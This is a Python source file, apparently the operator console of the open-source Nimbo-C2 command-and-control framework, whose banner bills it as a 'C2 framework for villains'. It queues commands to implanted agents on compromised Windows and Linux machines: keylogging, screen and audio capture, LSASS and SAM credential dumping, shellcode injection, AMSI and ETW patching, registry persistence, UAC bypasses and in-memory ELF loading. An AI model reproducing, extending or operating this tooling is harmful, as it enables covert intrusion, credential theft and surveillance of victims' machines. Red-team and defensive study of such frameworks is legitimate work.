from server import utils
from server import listener
from server import ps_modules

import os
import re
import json
import shlex
import random
import subprocess
from tabulate import tabulate
from jsonc_parser.parser import JsoncParser
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.formatted_text import FormattedText
from prompt_toolkit.output import ColorDepth


banner = """

    ███    ██ ██ ███    ███ ██████   ██████                 ██████ ██████  
    ████   ██ ██ ████  ████ ██   ██ ██    ██               ██           ██ 
    ██ ██  ██ ██ ██ ████ ██ ██████  ██    ██     █████     ██       █████  
    ██  ██ ██ ██ ██  ██  ██ ██   ██ ██    ██               ██      ██      
    ██   ████ ██ ██      ██ ██████   ██████                 ██████ ███████ 
    
    >> Lightweight C2 Framework for villains :)
       https://github.com/itaymigdal/Nimbo-C2
       By Itay Migdal
       
            +-
            -@=           .........              *-
    +*++-:.  :@-   . ..-=*##+.::.:++=-:..       #*   .-=++:
    :=**####*=*@::-:-+%@@@%#+:::.-##@@%*=:..   *#.=*%%%#+-
       :-+*#%%%*==-*@@%*=-::::::::--=*#@@%+-:.+@##*=:.
      .---::...==:+%#=--::::::::::::::-=+%@%-:-****+=.
              .=-:::--.     :::::::.  .:--=-:::     .
              :=-::--  -*##: ::::. -==. .=:::::
              :=-::=. -%%%:  .-:. #@@@*. :=:::.
              :=-:-=  +@++=. .-- =@#++   .=:::.
              :=-::=: .*%%%- -:- .%%##-  -=:::
              .=-::-=:  ..  --:-: .-=:  :=--::
              .=--==---::::-------.   :-=--::-
              -=--*-.----------------------::-.
             .===--++*#++=---:::-:----=----:--:
             -===--=:*%%%%%%#**--+=..+=----::.-.
             =.:+---:=*####%#=%%##+.:---==::: ::
            :: .===------===-.---:------+=:-.  :
           .-   ==++-===-----=----------==-:.  .:
        :--=-   :==+=--------------------+--.   -:::.
         .       -======----------------==--:
                 .========================---
                  .======-:..   ..::-=======-
                   .===:              .:-====.
                  ..-=.                  .:-=-...
     ...........:---:..................:....:----:................
     
    """


# parse config
config = JsoncParser.parse_file("config.jsonc")
log_file = config["c2"]["logging"]["log_file"]
is_save_agents_on_exit = config["c2"]["save_agents_data"]["save_on_exit"]
agents_file_path = config["c2"]["save_agents_data"]["save_path"]
agent_prompt_color = config["c2"]["prompt"]["agent_prompt_color"]
nimbo_prompt_color = config["c2"]["prompt"]["nimbo_prompt_color"]
start_listener_on_start = config["c2"]["general"]["start_listener_on_start"]
collect_folder = config["c2"]["general"]["collect_folder"]

user_agent_pattern = r"[0-9a-f]{8}"
main_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 > ")])
agent_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 "),
                                   (f"fg:{agent_prompt_color}", "[AGENT-ID]"), ("", " > ")])
agent_completer_windows = NestedCompleter.from_nested_dict({
    'cmd': None,
    'iex': None,
    'spawn': None,
    'download': None,
    'upload': None,
    'pstree': None,
    'modules': None,
    'modules_full': None,
    'checksec': None,
    'software': None,
    'windows': None,
    'clipboard': None,
    'screenshot': None,
    'audio': None,
    'keylog': {
        'start': None,
        'dump': None,
        'stop': None
    },
    'patch': {
        'amsi': None,
        'etw': None
    },
    'persist': {
        'run': None,
        'spe': None
    },
    'uac': {
        'fodhelper': None,
        'sdclt': None
    },
    'lsass': {
        'examine': None,
        'direct': None,
        'comsvcs': None,
        'eviltwin': None
    },
    'samdump': None,
    'shellc': None,
    'assembly': None,
    'msgbox': None,
    'speak': None,
    'critical': {
        'true': None,
        'false': None
    },
    'sleep': None,
    'clear': None,
    'collect': None,
    'die': None,
    'show': None,
    'back': None,
    'cls': None,
    'help': None,
    'exit': None
})
agent_completer_linux = NestedCompleter.from_nested_dict({
    'cmd': None,
    'download': None,
    'upload': None,
    'memfd': {
        'task': None,
        'implant': None
    },
    'sleep': None,
    'clear': None,
    'collect': None,
    'die': None,
    'show': None,
    'back': None,
    'cls': None,
    'help': None,
    'exit': None
})

elevated_commands = [
    "lsass",
    "persist-spe",
    "critical"
]
elevated_commands_ps_modules = [
    "samdump"
]


def exit_nimbo():
    listener.listener_stop()
    if is_save_agents_on_exit:
        try:
            with open(agents_file_path, "wt") as f:
                json.dump(listener.agents, f)
            utils.log_message(f"Saved agent data")
        except Exception:
            utils.log_message(f"[-] Could not save agent data")

    exit()


def print_main_help():
    main_help = f"""
    --== Agent ==--
    agent list                    ->  List active agents
    agent interact <agent-id>     ->  Interact with the agent
    agent remove <agent-id>       ->  Remove agent data
    
    --== Builder ==--
    build exe                     ->  Build EXE agent (-h for help)
    build dll                     ->  Build DLL agent (-h for help)
    build elf                     ->  Build ELF agent (-h for help)

    --== Listener ==--
    listener start                ->  Start the listener
    listener stop                 ->  Stop the listener
    listener status               ->  Print the listener status
    
    --== General ==--
    cls                           ->  Clear the screen
    help                          ->  Print this help message
    exit                          ->  Exit Nimbo-C2
    ! <command>                   ->  Execute system command
    """

    print(main_help)


def print_agent_help(os):
    
    windows_help = f"""
    --== Send Commands ==--
    cmd <shell-command>                    ->  Execute a shell command 
    iex <powershell-scriptblock>           ->  Execute in-memory powershell command
    spawn <process-cmdline>                ->  Spawn new process using WMI win32_process class
    
    --== File Stuff ==--
    download <remote-file>                 ->  Download a file from the agent (wrap path with quotes)
    upload <local-file> <remote-path>      ->  Upload a file to the agent (wrap paths with quotes)
    
    --== Discovery Stuff ==--
    pstree                                 ->  Show process tree
    checksec                               ->  Enum security products
    software                               ->  Enum installed software
    windows                                ->  Enum visible windows
    modules                                ->  Enum process loaded modules (exclude Microsoft Dlls)
    modules_full                           ->  Enum process loaded modules (include Microsoft Dlls)
    
    --== Collection Stuff ==--
    clipboard                              ->  Retrieve clipboard
    screenshot                             ->  Retrieve screenshot
    audio <record-time>                    ->  Record audio (waits for completion)
    keylog start                           ->  Start a keylogger in a new thread
    keylog dump                            ->  Retrieve captured keystrokes
    keylog stop                            ->  Retrieve captured keystrokes and stop the keylogger
    
    --== Post Exploitation Stuff ==--
    lsass examine                          ->  Examine Lsass protections
    lsass direct                           ->  Dump Lsass directly (elevation required)
    lsass comsvcs                          ->  Dump Lsass using Rundll32 and Comsvcs.dll (elevation required)
    lsass eviltwin                         ->  Dump Lsass using the Evil Lsass Twin method (elevation required)
    samdump                                ->  Dump SAM hashes using inline PowerDump.ps1 (elevation required)
    shellc <raw-shellcode-file> <pid>      ->  Inject shellcode to a remote process using indirect syscalls
    assembly <local-assembly> <args>       ->  Execute inline .NET assembly (pass all args as a single quoted string)
    
    --== Evasion Stuff ==--
    patch amsi                             ->  Patch AMSI using indirect syscalls
    patch etw                              ->  Patch ETW using indirect syscalls
    
    --== Persistence Stuff ==--
    persist run <command> <key-name>       ->  Set run key (will try first HKLM, then HKCU)
    persist spe <command> <process-name>   ->  Persist using Silent Process Exit technique (elevation required)
    
    --== Privesc Stuff ==--
    uac fodhelper <command>                ->  Elevate session using the Fodhelper UAC bypass technique
    uac sdclt <command>                    ->  Elevate session using the Sdclt UAC bypass technique
    
    --== Interaction stuff ==--
    msgbox <title> <text>                  ->  Pop a message box in a new thread
    speak <text>                           ->  Speak a string using the microphone
    
    --== Misc stuff ==--
    critical <true/false>                  -> Set process critical (BSOD on termination) (elevation required)

    --== Communication Stuff ==--
    sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
    clear                                  ->  Clear pending commands
    collect                                ->  Recollect agent data
    die                                    ->  Kill the agent
    
    --== General ==--
    show                                   ->  Show agent details
    back                                   ->  Back to main screen
    cls                                    ->  Clear the screen
    help                                   ->  Print this help message
    exit                                   ->  Exit Nimbo-C2
    ! <command>                            ->  Execute system command
    """

    linux_help = f"""
    --== Send Commands ==--
    cmd <shell-command>                    ->  Execute a terminal command 
    
    --== File Stuff ==--
    download <remote-file>                 ->  Download a file from the agent (wrap path with quotes)
    upload <local-file> <remote-path>      ->  Upload a file to the agent (wrap paths with quotes)
    
    --== Post Exploitation Stuff ==--
    memfd <mode> <elf-file> <commandline>  ->  Load ELF in-memory using the memfd_create syscall
                                               implant mode: load the ELF as a child process and return
                                               task mode: load the ELF as a child process, wait on it, and get its output when it's done
                                               (pass the whole command line as a single quoted string)
    
    --== Communication Stuff ==--
    sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
    clear                                  ->  Clear pending commands
    collect                                ->  Recollect agent data
    die                                    ->  Kill the agent
    
    --== General ==--
    show                                   ->  Show agent details
    back                                   ->  Back to main screen
    cls                                    ->  Clear the screen
    help                                   ->  Print this help message
    exit                                   ->  Exit Nimbo-C2
    ! <command>                            ->  Execute system command
    """
    
    if os == "windows":
        print(windows_help)
    elif os == "linux":
        print(linux_help)


def print_agents(agent=None):

    agents = listener.agents

    if len(agents) == 0:
        print("[-] No active agents")
        return

    if agent:
        agents = {agent: agents[agent] for a in agents if a == agent}

    agent_table = {"Agent ID": [agent for agent in agents]}
    for p in [i for i in list(agents.values())[0]["info"]]:
        agent_table[p] = [agents[agent]["info"][p] for agent in agents if agents[agent]["info"].get(p)]

    utils.log_message(f"\n{tabulate(agent_table, headers='keys', tablefmt='grid')}\n", print_time=False)


def parse_common_command(command):
    if re.fullmatch(r"\s*cls\s*", command):
        utils.clear_screen()

    elif re.fullmatch(r"\s*exit\s*", command):
        raise KeyboardInterrupt

    elif re.fullmatch(r"\s*!.*", command):
        shell_command = re.sub(r"\s*!", "", command, 1)
        os.system(shell_command)

    elif re.fullmatch(r"\s*", command):
        return

    else:
        print("[-] Wrong command")


def agent_screen_windows(agent_id):
    while True:
        with patch_stdout():
            command = session.prompt(eval(str(agent_prompt_text).replace("AGENT-ID", agent_id)),
                                     completer=agent_completer_windows,
                                     complete_while_typing=False,
                                     color_depth=ColorDepth.TRUE_COLOR,
                                     wrap_lines=False)

        try:
            if re.fullmatch(r"\s*cmd .+", command):
                shell_command = re.sub(r"\s*cmd\s+", "", command, 1)
                command_dict = {
                    "command_type": "cmd",
                    "shell_command": "cmd.exe /c " + shell_command
                }

            elif re.fullmatch(r"\s*iex .+", command):
                powershell_command = re.sub(r"\s*iex\s+", "", command, 1)
                encoded_powershell_command = utils.encode_base_64(powershell_command)
                command_dict = {
                    "command_type": "iex",
                    "encoded_powershell_command": encoded_powershell_command
                }

            # handle ps_modules
            elif re.fullmatch(
                r"\s*(pstree|software|modules|modules_full|samdump)\s*", command):
                ps_module = command.replace(" ", "")
                powershell_command = getattr(ps_modules, ps_module)
                encoded_powershell_command = utils.encode_base_64(powershell_command)
                command_dict = {
                    "command_type": "iex",
                    "ps_module": ps_module,
                    "encoded_powershell_command": encoded_powershell_command
                }

            elif re.fullmatch(r"\s*spawn .+", command):
                cmdline = re.sub(r"\s*spawn\s+", "", command, 1)
                command_dict = {
                    "command_type": "spawn",
                    "cmdline": cmdline
                }

            elif re.fullmatch(r"\s*download .+", command):
                remote_file = shlex.split(re.sub(r"\s*download\s+", "", command, 1))[0]
                command_dict = {
                    "command_type": "download",
                    "src_file": remote_file
                }

            elif re.fullmatch(r"\s*upload .+", command):
                args = re.sub(r"\s*upload\s+", "", command, 1)
                local_file = shlex.split(args)[0]
                remote_file = shlex.split(args)[1]
                local_file_content = utils.read_file(local_file)
                if not local_file_content:
                    continue
                else:
                    src_file_data_base64 = utils.encode_base_64(local_file_content, encoding="utf-8")
                command_dict = {
                    "command_type": "upload",
                    "src_file_data_base64": src_file_data_base64,
                    "dst_file_path": remote_file
                }

            elif re.fullmatch(r"\s*checksec\s*", command):
                command_dict = {
                    "command_type": "checksec"
                }
            
            elif re.fullmatch(r"\s*windows\s*", command):
                command_dict = {
                    "command_type": "windows"
                }

            elif re.fullmatch(r"\s*clipboard\s*", command):
                command_dict = {
                    "command_type": "clipboard"
                }

            elif re.fullmatch(r"\s*screenshot\s*", command):
                command_dict = {
                    "command_type": "screenshot"
                }

            elif re.fullmatch(r"\s*audio\s+\d+\s*", command):
                record_time = int(re.sub(r"\s*audio\s+", "", command, 1))
                command_dict = {
                    "command_type": "audio",
                    "record_time": record_time,
                }

            elif re.fullmatch(r"\s*lsass\s+examine", command):
                command_dict = {
                    "command_type": "lsass-examine",
                }

            elif re.fullmatch(r"\s*lsass\s+(direct|comsvcs|eviltwin)", command):
                dump_method = re.sub(r"\s*lsass\s+", "", command, 1)
                command_dict = {
                    "command_type": "lsass",
                    "dump_method": dump_method
                }

            elif re.fullmatch(r"\s*shellc .+", command):
                args = re.sub(r"\s*shellc\s+", "", command, 1)
                shellc_file = shlex.split(args)[0]
                pid = int(shlex.split(args)[1])
                shellc_file_content = utils.read_file(shellc_file)
                if not shellc_file_content:
                    continue
                else:
                    shellc_base64 = utils.encode_base_64(shellc_file_content, encoding="utf-8")
                command_dict = {
                    "command_type": "shellc",
                    "shellc_base64": shellc_base64,
                    "pid": pid
                }

            elif re.fullmatch(r"\s*assembly .+", command):
                args = re.sub(r"\s*assembly\s+", "", command, 1)
                assembly_file = shlex.split(args)[0]
                assembly_args = shlex.split(args)[1]
                assembly = utils.read_file(assembly_file)
                if not assembly:
                    continue
                else:
                    assembly_base64 = utils.encode_base_64(assembly)
                command_dict = {
                    "command_type": "assembly",
                    "assembly_base64": assembly_base64,
                    "assembly_args": assembly_args
                }

            elif re.fullmatch(r"\s*keylog\s+(start|dump|stop)\s*", command):
                action = shlex.split(re.sub(r"\s*keylog\s+", "", command, 1))[0]
                command_dict = {
                    "command_type": "keylog",
                    "action": action
                }
            
            elif re.fullmatch(r"\s*patch\s+(etw|amsi)\s*", command):
                patch_func = shlex.split(re.sub(r"\s*patch\s+", "", command, 1))[0]
                command_dict = {
                    "command_type": "patch",
                    "patch_func": patch_func
                }

            elif re.fullmatch(r"\s*persist\s+(run|spe)\s+.*", command):
                args = shlex.split(re.sub(r"\s*persist\s+", "", command, 1))
                persist_method = args[0]
                persist_command = args[1]
                command_dict = {
                    "command_type": "persist-" + persist_method,
                    "persist_command": persist_command
                }
                if persist_method == "run":
                    command_dict["key_name"] = args[2]
                elif persist_method == "spe":
                    command_dict["process_name"] = args[2]
                else:  # should not get here
                    continue

            elif re.fullmatch(r"\s*uac\s+(fodhelper|sdclt)\s+.*\s*", command):
                
                if listener.agents[agent_id]["info"]["Elevated"].strip() == 'True':
                    utils.log_message(f"[-] Already elevated", print_time=False)
                    continue
        
                args = shlex.split(re.sub(r"\s*uac\s+", "", command, 1))
                bypass_method = args[0]
                elevated_command = args[1]
                command_dict = {
                    "command_type": "uac-bypass",
                    "bypass_method": bypass_method,
                    "elevated_command": elevated_command
                }

            elif re.fullmatch(r"\s*msgbox .+", command):
                args = re.sub(r"\s*msgbox\s+", "", command, 1)
                title = shlex.split(args)[0]
                text = shlex.split(args)[1]
                command_dict = {
                    "command_type": "msgbox",
                    "title": title,
                    "text": text
                }

            elif re.fullmatch(r"\s*speak .+", command):
                text = shlex.split(re.sub(r"\s*speak\s+", "", command, 1))[0]
                command_dict = {
                    "command_type": "speak",
                    "text": text
                }
            
            elif re.fullmatch(r"\s*critical\s+(true|false)\s*", command):   
                is_critical = shlex.split(re.sub(r"\s*critical\s+", "", command, 1))[0]
                command_dict = {
                    "command_type": "critical",
                    "is_critical": is_critical,
                }

            elif re.fullmatch(r"\s*sleep\s+\d+\s+\d+\s*", command):
                args = re.sub(r"\s*sleep\s+", "", command, 1)
                timeframe = int(re.split(r"\s+", args)[0])
                jitter_percent = int(re.split(r"\s+", args)[1])
                command_dict = {
                    "command_type": "sleep",
                    "timeframe": timeframe,
                    "jitter_percent": jitter_percent
                }

            elif re.fullmatch(r"\s*clear\s*", command):
                listener.agents[agent_id]["pending_commands"] = []
                continue

            elif re.fullmatch(r"\s*die\s*", command):
                command_dict = {
                    "command_type": "die"
                }

            elif re.fullmatch(r"\s*collect\s*", command):
                command_dict = {
                    "command_type": "collect"
                }

            elif re.fullmatch(r"\s*show\s*", command):
                print_agents(agent=agent_id)
                continue

            elif re.fullmatch(r"\s*back\s*", command):
                return

            elif re.fullmatch(r"\s*help\s*", command):
                print_agent_help("windows")
                continue

            else:
                parse_common_command(command)
                continue

            if \
                (command_dict["command_type"] in elevated_commands or \
                    (command_dict["command_type"] == "iex" and "ps_module" in command_dict and command_dict["ps_module"] in elevated_commands_ps_modules)) and \
                listener.agents[agent_id]["info"]["Elevated"].strip() == 'False':
                utils.log_message(f"[-] This command requires elevation", print_time=False)
                continue
            else:
                listener.agents[agent_id]["pending_commands"] += [command_dict]
        
        except Exception:
            print("[-] Could not parse command")
            continue


def agent_screen_linux(agent_id):
    while True:
        with patch_stdout():
            command = session.prompt(eval(str(agent_prompt_text).replace("AGENT-ID", agent_id)),
                                     completer=agent_completer_linux,
                                     complete_while_typing=False,
                                     color_depth=ColorDepth.TRUE_COLOR,
                                     wrap_lines=False)

        try:
            if re.fullmatch(r"\s*cmd .+", command):
                shell_command = re.sub(r"\s*cmd\s+", "", command, 1)
                shell_command = shell_command.replace('"', "'")
                command_dict = {
                    "command_type": "cmd",
                    "shell_command": f"/bin/bash -c \"{shell_command}\""
                }

            elif re.fullmatch(r"\s*download .+", command):
                remote_file = shlex.split(re.sub(r"\s*download\s+", "", command, 1))[0]
                command_dict = {
                    "command_type": "download",
                    "src_file": remote_file
                }

            elif re.fullmatch(r"\s*upload .+", command):
                args = re.sub(r"\s*upload\s+", "", command, 1)
                local_file = shlex.split(args)[0]
                remote_file = shlex.split(args)[1]
                local_file_content = utils.read_file(local_file)
                if not local_file_content:
                    continue
                else:
                    src_file_data_base64 = utils.encode_base_64(local_file_content, encoding="utf-8")
                command_dict = {
                    "command_type": "upload",
                    "src_file_data_base64": src_file_data_base64,
                    "dst_file_path": remote_file
                }

            elif re.fullmatch(r"\s*memfd\s+(implant|task)\s+.+", command):
                args = re.sub(r"\s*memfd\s+", "", command, 1)
                mode = shlex.split(args)[0]
                elf_file = shlex.split(args)[1]
                command_line = shlex.split(args)[2]
                elf_file_content = utils.read_file(elf_file)
                if not elf_file_content:
                    continue
                else:
                    elf_file_data_base64 = utils.encode_base_64(elf_file_content, encoding="utf-8")
                command_dict = {
                    "command_type": "memfd",
                    "mode": mode,
                    "command_line": command_line,
                    "elf_file_data_base64": elf_file_data_base64
                }

            elif re.fullmatch(r"\s*sleep\s+\d+\s+\d+\s*", command):
                args = re.sub(r"\s*sleep\s+", "", command, 1)
                timeframe = int(re.split(r"\s+", args)[0])
                jitter_percent = int(re.split(r"\s+", args)[1])
                command_dict = {
                    "command_type": "sleep",
                    "timeframe": timeframe,
                    "jitter_percent": jitter_percent
                }

            elif re.fullmatch(r"\s*clear\s*", command):
                listener.agents[agent_id]["pending_commands"] = []
                continue

            elif re.fullmatch(r"\s*die\s*", command):
                command_dict = {
                    "command_type": "die"
                }

            elif re.fullmatch(r"\s*collect\s*", command):
                command_dict = {
                    "command_type": "collect"
                }

            elif re.fullmatch(r"\s*show\s*", command):
                print_agents(agent=agent_id)
                continue

            elif re.fullmatch(r"\s*back\s*", command):
                return

            elif re.fullmatch(r"\s*help\s*", command):
                print_agent_help("linux")
                continue
            
            else:
                parse_common_command(command)
                continue

            listener.agents[agent_id]["pending_commands"] += [command_dict]

            

        except Exception:
            print("[-] Could not parse command")
            continue


def send_build_command(build_params):
    build_command = "python3 builder/build.py " + build_params
    try:    
        subprocess.run(build_command, shell=True)
    except:
        utils.log_message(f"[-] Stopping build", print_time=False)


def main_screen():
    while True:
        agents_dict = dict.fromkeys(list(listener.agents.keys()))
        main_completer = NestedCompleter.from_nested_dict({
            'agent': {
                'list': None,
                'interact': agents_dict,
                'remove': agents_dict
            },
            'build': {
                'exe': None,
                'dll': None,
                'elf': None
            },
            'listener': {
                'start': None,
                'status': None,
                'stop': None
            },
            'cls': None,
            'help': None,
            'exit': None
        })
        with patch_stdout():
            command = session.prompt(main_prompt_text, completer=main_completer, complete_while_typing=False,
                                     color_depth=ColorDepth.TRUE_COLOR)

        if re.fullmatch(r"\s*agent\s+list\s*", command):
            print_agents()

        elif re.fullmatch(r"\s*agent\s+interact\s+" + user_agent_pattern, command):
            agent_id = re.split(r"\s+", command)[2]
            if "windows" in listener.agents[agent_id]["info"]["OS Version"].lower():
                agent_screen_windows(agent_id)
            else:
                agent_screen_linux(agent_id)

        elif re.fullmatch(r"\s*agent\s+remove\s+" + user_agent_pattern, command):
            agent_id = re.split(r"\s+", command)[2]
            listener.agents.pop(agent_id)

        elif re.fullmatch(r"\s*agent\s+list\s*", command):
            print_agents()
        
        elif re.fullmatch(r"\s*build\s+.*", command):
            build_params = re.sub(r"\s*build\s+", "", command, 1)
            send_build_command(build_params)

        elif re.fullmatch(r"\s*listener\s+start\s*", command):
            listener.listener_start()

        elif re.fullmatch(r"\s*listener\s+status\s*", command):
            listener.listener_status()

        elif re.fullmatch(r"\s*listener\s+stop\s*", command):
            listener.listener_stop()
        
        elif re.fullmatch(r"\s*help\s*", command):
            print_main_help()
        
        else:
            parse_common_command(command)


if __name__ == '__main__':
    try:
        # create prompt session
        session = PromptSession()
        # print Nimbo-C2 banner
        print(banner)
        # handle agents data loading
        if is_save_agents_on_exit:
            try:
                with open(agents_file_path, "rt") as f:
                    listener.agents = json.load(f)
                utils.log_message(f"Loaded agent data")
            except Exception:
                utils.log_message(f"[-] Could not load agent data")
        # handle listener starting
        if start_listener_on_start:
            listener.listener_start()
            utils.log_message(f"Listener started")
        # go to main screen
        main_screen()

    except KeyboardInterrupt:
        pass
    except Exception as e:
        utils.log_message("[-] Error:", e)
    finally:
        exit_nimbo()